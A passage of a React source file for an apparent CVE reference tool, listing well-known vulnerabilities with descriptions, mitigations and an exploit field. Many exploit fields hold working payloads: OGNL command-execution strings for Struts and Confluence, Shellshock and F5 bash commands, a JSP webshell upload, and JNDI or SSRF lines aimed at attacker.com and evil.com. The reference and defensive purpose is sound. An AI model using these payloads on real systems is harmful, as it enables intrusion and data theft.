import { useState, useMemo, useCallback } from 'react';
import { Card } from '../components/ui/Card.jsx';
import { Input } from '../components/ui/Input.jsx';
import { CopyButton } from '../components/ui/CopyButton.jsx';
import {
  Bug, Search, AlertTriangle, Shield, ExternalLink, ChevronDown,
  ChevronRight, Zap, Globe,
  Database, Code, Activity, Target,
  Hash, Calculator,
  ArrowUpDown, Clock, Loader2, ChevronLeft,
} from 'lucide-react';

const mono = 'JetBrains Mono, monospace';
const heading = 'Space Grotesk, sans-serif';
const accent = '#FB7185';

// ═══════════════════════════════════════════════════════════════
//  CVE DATABASE — 155 real, well-known vulnerabilities
// ═══════════════════════════════════════════════════════════════
const CVE_DATABASE = [
  // ── RCE (32) ───────────────────────────────────────────────
  { id: 'CVE-2021-44228', name: 'Log4Shell', severity: 'Critical', cvss: 10.0, published: '2021-12-10', category: 'RCE', affected: 'Apache Log4j 2.x < 2.15.0', description: 'Remote code execution via JNDI lookup injection in Apache Log4j logging library. Attackers can execute arbitrary code by sending a crafted log message containing a JNDI reference. One of the most impactful vulnerabilities ever discovered.', exploit: '${jndi:ldap://attacker.com/a}', mitigation: 'Upgrade to Log4j 2.17.0+, set log4j2.formatMsgNoLookups=true, remove JndiLookup class from classpath.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-44228'], tags: ['java', 'logging', 'jndi', 'rce', 'critical', 'log4j'], platform: 'Cross-platform' },
  { id: 'CVE-2021-44832', name: 'Log4j RCE via JDBC', severity: 'Medium', cvss: 6.6, published: '2021-12-28', category: 'RCE', affected: 'Apache Log4j 2.x < 2.17.1', description: 'Remote code execution through JDBC Appender when attacker has write access to Log4j configuration. Requires attacker to modify logging config to use a JDBC Appender with a JNDI data source.', exploit: 'Modify log4j2.xml to include JDBC Appender with JNDI DataSource URI', mitigation: 'Upgrade to Log4j 2.17.1+, restrict config file permissions.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-44832'], tags: ['java', 'logging', 'jdbc', 'log4j'], platform: 'Cross-platform' },
  { id: 'CVE-2017-5638', name: 'Apache Struts RCE', severity: 'Critical', cvss: 10.0, published: '2017-03-06', category: 'RCE', affected: 'Apache Struts 2.3.x < 2.3.32, 2.5.x < 2.5.10.1', description: 'Remote code execution via crafted Content-Type header in Apache Struts Jakarta Multipart parser. The vulnerability used in the Equifax breach affecting 147 million people.', exploit: '%{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'id\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}', mitigation: 'Upgrade Struts to 2.3.32+ or 2.5.10.1+, switch to Struts 6.x.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2017-5638'], tags: ['java', 'struts', 'ognl', 'equifax'], platform: 'Cross-platform' },
  { id: 'CVE-2019-0708', name: 'BlueKeep', severity: 'Critical', cvss: 9.8, published: '2019-05-14', category: 'RCE', affected: 'Windows 7, Server 2008/2008 R2, XP, Server 2003', description: 'Pre-authentication RCE in Windows Remote Desktop Services (RDP). Wormable vulnerability that does not require user interaction. NSA urged immediate patching.', exploit: 'Metasploit: exploit/windows/rdp/cve_2019_0708_bluekeep_rce', mitigation: 'Apply MS19-05 patch, enable NLA, disable RDP if not needed, block TCP 3389.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-0708'], tags: ['windows', 'rdp', 'wormable', 'pre-auth'], platform: 'Windows' },
  { id: 'CVE-2021-21972', name: 'VMware vCenter RCE', severity: 'Critical', cvss: 9.8, published: '2021-02-24', category: 'RCE', affected: 'VMware vCenter Server < 6.5 U3n, < 6.7 U3l, < 7.0 U1c', description: 'Unauthenticated RCE in vSphere Client (HTML5) plugin. Attacker can upload a crafted file via port 443 to execute commands as the vCenter Server service account.', exploit: 'curl -k -X POST "https://target/ui/vropspluginui/rest/services/uploadova" --data-binary @shell.jsp', mitigation: 'Apply VMware patches, restrict access to port 443 on vCenter.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-21972'], tags: ['vmware', 'vcenter', 'file-upload', 'pre-auth'], platform: 'Cross-platform' },
  { id: 'CVE-2021-26855', name: 'ProxyLogon', severity: 'Critical', cvss: 9.8, published: '2021-03-02', category: 'RCE', affected: 'Microsoft Exchange Server 2013-2019', description: 'SSRF vulnerability in Exchange allowing unauthenticated attackers to send arbitrary HTTP requests and authenticate as the Exchange server. Chained with CVE-2021-27065 for RCE. Exploited by HAFNIUM group.', exploit: 'POST /owa/auth/x.js HTTP/1.1\nCookie: X-AnonResource=true; X-AnonResource-Backend=target/ecp/default.flt?~3\nHost: target', mitigation: 'Apply Microsoft security updates, use Microsoft Exchange On-Premises Mitigation Tool.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-26855'], tags: ['exchange', 'microsoft', 'ssrf', 'hafnium', 'apt'], platform: 'Windows' },
  { id: 'CVE-2021-34473', name: 'ProxyShell', severity: 'Critical', cvss: 9.8, published: '2021-07-14', category: 'RCE', affected: 'Microsoft Exchange Server 2013-2019', description: 'Pre-authentication path confusion in Exchange leading to arbitrary file write and RCE. Part of a chain with CVE-2021-34523 and CVE-2021-31207 to achieve unauthenticated RCE.', exploit: 'GET /autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com', mitigation: 'Apply Exchange cumulative updates and security updates from July 2021.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-34473'], tags: ['exchange', 'microsoft', 'pre-auth', 'chain'], platform: 'Windows' },
  { id: 'CVE-2020-0688', name: 'Exchange RCE via ViewState', severity: 'High', cvss: 8.8, published: '2020-02-11', category: 'RCE', affected: 'Microsoft Exchange Server 2010-2019', description: 'RCE via deserialization of ViewState using a static validation key and generation key in Exchange Control Panel. Any authenticated user can achieve SYSTEM-level RCE.', exploit: 'ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c calc" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27"', mitigation: 'Apply Microsoft February 2020 security patches immediately.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-0688'], tags: ['exchange', 'microsoft', 'deserialization', 'viewstate'], platform: 'Windows' },
  { id: 'CVE-2017-0144', name: 'EternalBlue', severity: 'Critical', cvss: 9.8, published: '2017-03-14', category: 'RCE', affected: 'Windows SMBv1 (XP through Server 2012)', description: 'Buffer overflow in Windows SMBv1 protocol allowing remote code execution. Leaked NSA exploit used in WannaCry and NotPetya ransomware attacks causing billions in damages worldwide.', exploit: 'Metasploit: exploit/windows/smb/ms17_010_eternalblue\nNmap: nmap -p445 --script smb-vuln-ms17-010 target', mitigation: 'Apply MS17-010 patch, disable SMBv1, block port 445 at firewall.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2017-0144'], tags: ['windows', 'smb', 'nsa', 'wannacry', 'notpetya', 'wormable'], platform: 'Windows' },
  { id: 'CVE-2014-6271', name: 'Shellshock', severity: 'Critical', cvss: 9.8, published: '2014-09-24', category: 'RCE', affected: 'GNU Bash < 4.3 patch 25', description: 'Arbitrary command execution through crafted environment variables in Bash. Affects CGI scripts, DHCP clients, SSH forced commands, and any service that invokes Bash with attacker-controlled environment variables.', exploit: '() { :; }; /bin/cat /etc/passwd\ncurl -A "() { :; }; /bin/bash -c \'cat /etc/passwd\'" http://target/cgi-bin/script.sh', mitigation: 'Update Bash to 4.3 patch 25 or later, use mod_security WAF rules.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2014-6271'], tags: ['bash', 'linux', 'cgi', 'env-var', 'unix'], platform: 'Linux' },
  { id: 'CVE-2021-22205', name: 'GitLab RCE via ExifTool', severity: 'Critical', cvss: 10.0, published: '2021-04-14', category: 'RCE', affected: 'GitLab CE/EE < 13.10.3, < 13.9.6, < 13.8.8', description: 'Unauthenticated RCE through image file upload that gets processed by ExifTool. Attackers can embed malicious DjVu metadata to execute arbitrary commands on the GitLab server.', exploit: 'Upload crafted DjVu image with embedded payload:\n(metadata (Copyright "\\n" . qx{id} . "\\n"))', mitigation: 'Upgrade GitLab to patched versions, disable public project creation.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-22205'], tags: ['gitlab', 'exiftool', 'file-upload', 'pre-auth'], platform: 'Linux' },
  { id: 'CVE-2020-1472', name: 'Zerologon', severity: 'Critical', cvss: 10.0, published: '2020-08-11', category: 'RCE', affected: 'Windows Server 2008-2019 (Netlogon)', description: 'Critical flaw in Netlogon Remote Protocol (MS-NRPC) cryptographic authentication allowing domain controller takeover. Attacker can set an empty password for the DC machine account by exploiting a crypto flaw.', exploit: 'python3 zerologon_tester.py DC_NAME DC_IP\npython3 cve-2020-1472-exploit.py DC_NAME DC_IP', mitigation: 'Apply August 2020 patch, enable enforcement mode, monitor for Netlogon anomalies.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-1472'], tags: ['windows', 'active-directory', 'netlogon', 'domain-controller', 'crypto'], platform: 'Windows' },
  { id: 'CVE-2023-44487', name: 'HTTP/2 Rapid Reset', severity: 'High', cvss: 7.5, published: '2023-10-10', category: 'DoS', affected: 'HTTP/2 implementations (Nginx, Apache, IIS, etc.)', description: 'DDoS amplification attack exploiting HTTP/2 stream cancellation. Attacker rapidly opens and resets streams causing resource exhaustion. Used in the largest DDoS attack ever recorded (398M rps).', exploit: 'Rapidly send HEADERS frame followed by RST_STREAM on HTTP/2 connections', mitigation: 'Apply vendor patches, limit concurrent streams, implement rate limiting on RST_STREAM frames.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-44487'], tags: ['http2', 'ddos', 'protocol', 'web'], platform: 'Cross-platform' },
  { id: 'CVE-2024-3094', name: 'XZ Utils Backdoor', severity: 'Critical', cvss: 10.0, published: '2024-03-29', category: 'RCE', affected: 'XZ Utils 5.6.0-5.6.1', description: 'Sophisticated supply chain attack injecting a backdoor into XZ Utils liblzma library. The backdoor modifies SSH daemon authentication to allow unauthorized remote access. Discovered by Andres Freund before widespread deployment.', exploit: 'Supply chain backdoor — malicious code injected via compromised build scripts targeting sshd via systemd integration.', mitigation: 'Downgrade to XZ Utils 5.4.x, rebuild affected packages, audit systems running 5.6.0/5.6.1.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2024-3094'], tags: ['supply-chain', 'linux', 'ssh', 'backdoor', 'xz'], platform: 'Linux' },
  { id: 'CVE-2021-3156', name: 'Baron Samedit', severity: 'High', cvss: 7.8, published: '2021-01-26', category: 'Privilege Escalation', affected: 'sudo < 1.9.5p2', description: 'Heap-based buffer overflow in sudo when parsing command line arguments with backslash-escaped characters in sudoedit mode. Any local user can gain root privileges without authentication.', exploit: 'sudoedit -s \'\\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\npython3 exploit_nss.py', mitigation: 'Update sudo to 1.9.5p2 or later.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-3156'], tags: ['linux', 'sudo', 'heap-overflow', 'local-privesc'], platform: 'Linux' },
  { id: 'CVE-2023-23397', name: 'Outlook NTLM Leak', severity: 'Critical', cvss: 9.8, published: '2023-03-14', category: 'RCE', affected: 'Microsoft Outlook 2013-2021, 365', description: 'Zero-click NTLM credential theft in Outlook via crafted calendar invite with UNC path. Attacker can relay captured NTLMv2 hash for authentication without user interaction. Exploited by Russian APT28.', exploit: 'Send calendar invite with PidLidReminderFileParameter set to \\\\attacker\\share\\file', mitigation: 'Apply March 2023 patch, block outbound SMB (TCP 445), add users to Protected Users group.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-23397'], tags: ['outlook', 'microsoft', 'ntlm', 'zero-click', 'apt28'], platform: 'Windows' },
  { id: 'CVE-2022-26134', name: 'Confluence OGNL Injection', severity: 'Critical', cvss: 9.8, published: '2022-06-02', category: 'RCE', affected: 'Atlassian Confluence Server/DC < 7.4.17, < 7.13.7, < 7.14.3, < 7.15.2, < 7.16.4, < 7.17.4, < 7.18.1', description: 'Unauthenticated OGNL injection vulnerability allowing arbitrary code execution. Attackers can inject OGNL expressions via URI to execute system commands on the server.', exploit: 'curl "http://target/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%2C%27utf-8%27%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%27X-Cmd-Response%27%2C%23a%29%29%7D/"', mitigation: 'Upgrade Confluence immediately, restrict internet access to Confluence, WAF rules for OGNL patterns.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-26134'], tags: ['confluence', 'atlassian', 'ognl', 'pre-auth', 'java'], platform: 'Cross-platform' },
  { id: 'CVE-2023-22515', name: 'Confluence Auth Bypass', severity: 'Critical', cvss: 10.0, published: '2023-10-04', category: 'Auth Bypass', affected: 'Atlassian Confluence DC/Server 8.0.0 - 8.5.1', description: 'Broken access control vulnerability allowing unauthenticated attackers to create admin accounts on Confluence instances. Actively exploited as a zero-day by nation-state threat actors.', exploit: 'POST /server-info.action HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nlabel=x&additionalparam=admin_setup', mitigation: 'Upgrade to Confluence 8.3.3+, 8.4.3+, or 8.5.2+. Block access to /setup/* endpoints.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-22515'], tags: ['confluence', 'atlassian', 'auth-bypass', 'zero-day'], platform: 'Cross-platform' },
  { id: 'CVE-2021-40444', name: 'MSHTML RCE', severity: 'High', cvss: 8.8, published: '2021-09-07', category: 'RCE', affected: 'Windows MSHTML (Internet Explorer engine)', description: 'RCE via crafted ActiveX controls in Microsoft Office documents using the MSHTML rendering engine. Attacker sends a malicious Office doc that loads an attacker-controlled website to deliver a malicious CAB file.', exploit: 'Crafted .docx with external relationship pointing to attacker HTML page with ActiveX payload', mitigation: 'Apply September 2021 patches, disable ActiveX in Internet Explorer, use ASR rules.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-40444'], tags: ['windows', 'office', 'mshtml', 'activex'], platform: 'Windows' },
  { id: 'CVE-2023-27997', name: 'FortiGate Heap Overflow', severity: 'Critical', cvss: 9.8, published: '2023-06-12', category: 'RCE', affected: 'FortiOS < 7.2.5, < 7.0.12, < 6.4.13, < 6.2.15', description: 'Pre-authentication heap-based buffer overflow in FortiOS SSL-VPN. Allows remote code execution via crafted requests to the SSL VPN web portal. Actively exploited in the wild.', exploit: 'Heap buffer overflow in SSL VPN pre-auth — specific PoC targets /remote/hostcheck_validate endpoint', mitigation: 'Upgrade FortiOS immediately, disable SSL-VPN if not needed, implement IP allowlisting.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-27997'], tags: ['fortinet', 'vpn', 'heap-overflow', 'pre-auth', 'firewall'], platform: 'Network' },
  { id: 'CVE-2022-22965', name: 'Spring4Shell', severity: 'Critical', cvss: 9.8, published: '2022-03-31', category: 'RCE', affected: 'Spring Framework 5.3.x < 5.3.18, 5.2.x < 5.2.20 (JDK 9+)', description: 'RCE via data binding on JDK 9+ when Spring MVC runs on Tomcat as a WAR. Attacker can modify ClassLoader attributes to write a JSP webshell to the Tomcat webroot.', exploit: 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B...%7D', mitigation: 'Upgrade to Spring Framework 5.3.18+, use Spring Boot 2.6.6+ or 2.5.12+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-22965'], tags: ['java', 'spring', 'tomcat', 'classloader'], platform: 'Cross-platform' },
  { id: 'CVE-2020-14882', name: 'WebLogic RCE', severity: 'Critical', cvss: 9.8, published: '2020-10-20', category: 'RCE', affected: 'Oracle WebLogic Server 10.3.6, 12.1.3, 12.2.1.3-4, 14.1.1', description: 'Unauthenticated RCE in Oracle WebLogic Server console component. Attackers can bypass authentication via crafted URL and then execute arbitrary commands through a gadget chain.', exploit: 'curl "http://target:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(\'id\')%22)"', mitigation: 'Apply Oracle October 2020 CPU, restrict access to WebLogic console.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-14882'], tags: ['oracle', 'weblogic', 'java', 'pre-auth', 'console'], platform: 'Cross-platform' },
  { id: 'CVE-2019-11043', name: 'PHP-FPM RCE', severity: 'Critical', cvss: 9.8, published: '2019-10-28', category: 'RCE', affected: 'PHP-FPM with Nginx (certain configs)', description: 'Buffer underflow in PHP-FPM when Nginx is configured with specific fastcgi_split_path_info regex. Allows remote code execution via crafted URL with %0a (newline) in path.', exploit: 'phuip-fpizdam "http://target/index.php"\ncurl "http://target/index.php?a=/bin/sh+-c+\'id > /tmp/pwned\'"', mitigation: 'Update PHP, fix Nginx fastcgi_split_path_info regex, use try_files.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-11043'], tags: ['php', 'nginx', 'fpm', 'buffer-underflow'], platform: 'Linux' },
  { id: 'CVE-2018-7600', name: 'Drupalgeddon2', severity: 'Critical', cvss: 9.8, published: '2018-03-28', category: 'RCE', affected: 'Drupal < 7.58, < 8.3.9, < 8.4.6, < 8.5.1', description: 'Remote code execution in Drupal core via Form API (FAPI) rendering. Unauthenticated attackers can execute arbitrary code by exploiting improper input sanitization in form rendering.', exploit: 'POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax\nform_id=user_register_form&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id', mitigation: 'Update Drupal core immediately. Monitor for indicators of compromise.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2018-7600'], tags: ['drupal', 'php', 'cms', 'pre-auth', 'form-api'], platform: 'Cross-platform' },
  { id: 'CVE-2017-12617', name: 'Tomcat PUT RCE', severity: 'High', cvss: 8.1, published: '2017-10-03', category: 'RCE', affected: 'Apache Tomcat < 7.0.82, < 8.0.47, < 8.5.23, < 9.0.1', description: 'Remote code execution via JSP upload when HTTP PUT is enabled (readonly=false). Attackers can upload a malicious JSP file using a trailing slash bypass to execute arbitrary code.', exploit: 'curl -X PUT "http://target/shell.jsp/" -d "<% Runtime.getRuntime().exec(request.getParameter(\\"cmd\\")); %>"', mitigation: 'Disable PUT method (readonly=true in web.xml), upgrade Tomcat.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2017-12617'], tags: ['tomcat', 'java', 'put', 'file-upload'], platform: 'Cross-platform' },
  { id: 'CVE-2021-41773', name: 'Apache Path Traversal + RCE', severity: 'Critical', cvss: 9.8, published: '2021-10-05', category: 'RCE', affected: 'Apache HTTP Server 2.4.49', description: 'Path traversal and RCE in Apache 2.4.49 due to flawed URL normalization. If mod_cgi is enabled, attackers can execute arbitrary commands. The initial fix (2.4.50) was also bypassed (CVE-2021-42013).', exploit: 'curl "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"', mitigation: 'Upgrade to Apache 2.4.51+, restrict Require directives.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-41773'], tags: ['apache', 'path-traversal', 'cgi', 'normalization'], platform: 'Cross-platform' },
  { id: 'CVE-2023-0669', name: 'GoAnywhere RCE', severity: 'High', cvss: 7.2, published: '2023-02-01', category: 'RCE', affected: 'Fortra GoAnywhere MFT < 7.1.2', description: 'Pre-authentication RCE in GoAnywhere MFT admin console via deserialization of untrusted data. Exploited by Clop ransomware group to steal data from over 130 organizations.', exploit: 'Java deserialization payload targeting /goanywhere/lic/accept endpoint', mitigation: 'Upgrade to GoAnywhere MFT 7.1.2+, restrict access to admin portal (port 8000).', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-0669'], tags: ['goanywhere', 'deserialization', 'ransomware', 'clop', 'file-transfer'], platform: 'Cross-platform' },
  { id: 'CVE-2023-34362', name: 'MOVEit SQLi to RCE', severity: 'Critical', cvss: 9.8, published: '2023-06-01', category: 'SQLi', affected: 'Progress MOVEit Transfer < 2021.0.7, < 2021.1.5, < 2022.0.5, < 2022.1.6, < 2023.0.1', description: 'SQL injection in MOVEit Transfer web application allowing unauthenticated access and RCE. Exploited by Clop ransomware group affecting 2,500+ organizations and 60+ million individuals.', exploit: 'POST /moveitisapi/moveitisapi.dll?action=m2 HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\ntransaction_id=\' UNION SELECT ...', mitigation: 'Apply vendor patches, restrict inbound access, review audit logs for IOCs.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-34362'], tags: ['moveit', 'sql-injection', 'ransomware', 'clop', 'file-transfer'], platform: 'Windows' },
  { id: 'CVE-2022-41040', name: 'ProxyNotShell', severity: 'High', cvss: 8.8, published: '2022-09-30', category: 'RCE', affected: 'Microsoft Exchange Server 2013-2019', description: 'SSRF vulnerability chained with CVE-2022-41082 for authenticated RCE. Similar to ProxyShell but requires authentication. Actively exploited before patches were available.', exploit: 'GET /autodiscover/autodiscover.json?@evil.com/powershell?X-Rps-CAT=...&Email=autodiscover/autodiscover.json%3F@evil.com', mitigation: 'Apply November 2022 Exchange patches, implement URL rewrite mitigation.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-41040'], tags: ['exchange', 'microsoft', 'ssrf', 'chain', 'powershell'], platform: 'Windows' },
  { id: 'CVE-2024-21762', name: 'FortiOS SSL VPN RCE', severity: 'Critical', cvss: 9.6, published: '2024-02-08', category: 'RCE', affected: 'FortiOS 6.x, 7.0.x < 7.0.14, 7.2.x < 7.2.7, 7.4.x < 7.4.2', description: 'Out-of-bounds write vulnerability in FortiOS SSL VPN allowing unauthenticated remote code execution via specially crafted HTTP requests. CISA added to KEV catalog.', exploit: 'Out-of-bounds write via crafted HTTP requests to SSL VPN portal', mitigation: 'Upgrade FortiOS, disable SSL VPN as workaround, apply virtual patches via FortiGuard.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2024-21762'], tags: ['fortinet', 'vpn', 'oob-write', 'pre-auth'], platform: 'Network' },
  { id: 'CVE-2023-46747', name: 'F5 BIG-IP Auth Bypass to RCE', severity: 'Critical', cvss: 9.8, published: '2023-10-26', category: 'RCE', affected: 'F5 BIG-IP 13.x-17.x (specific versions)', description: 'Authentication bypass via request smuggling in F5 BIG-IP Configuration Utility leading to unauthenticated RCE. AJP request smuggling allows accessing internal admin endpoints.', exploit: 'AJP smuggling via crafted HTTP request to bypass TMUI authentication', mitigation: 'Apply F5 hotfixes, restrict management access to trusted networks, block Configuration Utility access.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-46747'], tags: ['f5', 'bigip', 'request-smuggling', 'pre-auth'], platform: 'Network' },

  // ── SQLi (16) ──────────────────────────────────────────────
  { id: 'CVE-2019-9193', name: 'PostgreSQL COPY RCE', severity: 'High', cvss: 7.2, published: '2019-04-01', category: 'SQLi', affected: 'PostgreSQL 9.3 - 11.x', description: 'Authenticated users with COPY TO/FROM PROGRAM privilege can execute arbitrary OS commands. While technically "by design," this is commonly exploited for privilege escalation in pentest scenarios.', exploit: 'CREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM \'id\';', mitigation: 'Restrict COPY FROM PROGRAM to superusers only, use pg_hba.conf to limit access.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-9193'], tags: ['postgresql', 'database', 'command-execution'], platform: 'Cross-platform' },
  { id: 'CVE-2012-2661', name: 'Rails SQL Injection', severity: 'Medium', cvss: 5.3, published: '2012-06-22', category: 'SQLi', affected: 'Ruby on Rails 3.0.x, 3.1.x, 3.2.x', description: 'SQL injection via nested query parameters in Active Record. Attacker can inject arbitrary SQL through crafted hash parameters passed to where() clauses.', exploit: 'GET /users?user[name]=test&user[name][0]=1) OR 1=1--', mitigation: 'Upgrade to Rails 3.2.4+, sanitize query parameters.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2012-2661'], tags: ['rails', 'ruby', 'activerecord', 'orm'], platform: 'Cross-platform' },
  { id: 'CVE-2018-15133', name: 'Laravel Token Deserialization', severity: 'High', cvss: 8.1, published: '2018-08-09', category: 'RCE', affected: 'Laravel Framework < 5.6.30', description: 'Remote code execution when APP_KEY is known. Attacker can craft a malicious serialized payload as an X-XSRF-TOKEN cookie, which gets deserialized by the framework, leading to arbitrary code execution.', exploit: 'phpggc Laravel/RCE1 system "id" | base64\ncurl -H "X-XSRF-TOKEN: <encrypted_payload>" http://target', mitigation: 'Upgrade Laravel, rotate APP_KEY, never expose .env files.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2018-15133'], tags: ['laravel', 'php', 'deserialization', 'app-key'], platform: 'Cross-platform' },
  { id: 'CVE-2017-8917', name: 'Joomla SQLi', severity: 'Critical', cvss: 9.8, published: '2017-05-17', category: 'SQLi', affected: 'Joomla! 3.7.0', description: 'SQL injection in the com_fields component introduced in Joomla 3.7.0. Unauthenticated attackers can extract data from the database including password hashes and session tokens.', exploit: 'sqlmap -u "http://target/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 -p list[fullordering]', mitigation: 'Upgrade Joomla to 3.7.1 or later.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2017-8917'], tags: ['joomla', 'php', 'cms', 'pre-auth'], platform: 'Cross-platform' },
  { id: 'CVE-2015-7297', name: 'Joomla SQLi (Core)', severity: 'High', cvss: 7.5, published: '2015-10-22', category: 'SQLi', affected: 'Joomla! 3.2 - 3.4.4', description: 'SQL injection in Joomla core via crafted request headers. The vulnerability exists in the session handler and allows unauthenticated extraction of database contents.', exploit: 'sqlmap -u "http://target/" --headers="X-Forwarded-For: *" --dbs', mitigation: 'Upgrade to Joomla 3.4.5 or later.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2015-7297'], tags: ['joomla', 'php', 'cms', 'header-injection'], platform: 'Cross-platform' },
  { id: 'CVE-2019-6340', name: 'Drupal REST RCE', severity: 'Critical', cvss: 9.8, published: '2019-02-21', category: 'RCE', affected: 'Drupal 8.5.x < 8.5.11, 8.6.x < 8.6.10', description: 'RCE via REST API due to improper sanitization of field types. Certain field types do not properly sanitize data from non-form sources, enabling PHP object injection and code execution.', exploit: 'POST /node/1?_format=hal_json\nContent-Type: application/hal+json\n\n{"link":[{"value":"link","options":"O:24:\\"GuzzleHttp\\\\Psr7\\\\FnStream\\":2:..."}]}', mitigation: 'Upgrade Drupal, disable REST/RESTful Web Services if not needed.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-6340'], tags: ['drupal', 'php', 'rest-api', 'deserialization'], platform: 'Cross-platform' },
  { id: 'CVE-2016-3714', name: 'ImageTragick', severity: 'Critical', cvss: 8.4, published: '2016-05-05', category: 'RCE', affected: 'ImageMagick < 6.9.3-10, < 7.0.1-1', description: 'Multiple vulnerabilities in ImageMagick including RCE through insufficient filtering of shell metacharacters in filenames passed to delegates (coders). Affects any web app processing images with ImageMagick.', exploit: 'push graphic-context\nviewbox 0 0 640 480\nfill \'url(https://example.com/image.jpg"|id")\'  \npop graphic-context', mitigation: 'Upgrade ImageMagick, use policy.xml to disable vulnerable coders (MVG, MSL, HTTPS, etc.), validate file types before processing.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2016-3714'], tags: ['imagemagick', 'image-processing', 'delegate', 'shell'], platform: 'Cross-platform' },
  { id: 'CVE-2021-27928', name: 'MariaDB wsrep_provider RCE', severity: 'High', cvss: 7.2, published: '2021-03-19', category: 'SQLi', affected: 'MariaDB 10.2 - 10.5', description: 'Authenticated RCE via SET GLOBAL wsrep_provider command in MariaDB. An authenticated user with the SUPER privilege can load arbitrary shared libraries and execute code.', exploit: 'SET GLOBAL wsrep_provider="/tmp/malicious.so";', mitigation: 'Restrict SUPER privilege, upgrade MariaDB, use wsrep_provider_options to lock provider.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-27928'], tags: ['mariadb', 'mysql', 'database', 'shared-library'], platform: 'Linux' },
  { id: 'CVE-2021-22986', name: 'F5 BIG-IP iControl REST', severity: 'Critical', cvss: 9.8, published: '2021-03-10', category: 'RCE', affected: 'F5 BIG-IP 16.0.x, 15.1.x, 14.1.x, 13.1.x, 12.1.x', description: 'Unauthenticated RCE in F5 BIG-IP iControl REST API. Attackers can bypass authentication and execute arbitrary system commands via the /mgmt/tm/util/bash endpoint.', exploit: 'curl -sk -X POST "https://target/mgmt/tm/util/bash" -H "Authorization: Basic YWRtaW46" -H "Content-Type: application/json" -d \'{"command":"run","utilCmdArgs":"-c id"}\'', mitigation: 'Apply F5 patches, restrict management interface access to trusted networks.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-22986'], tags: ['f5', 'bigip', 'rest-api', 'pre-auth'], platform: 'Network' },
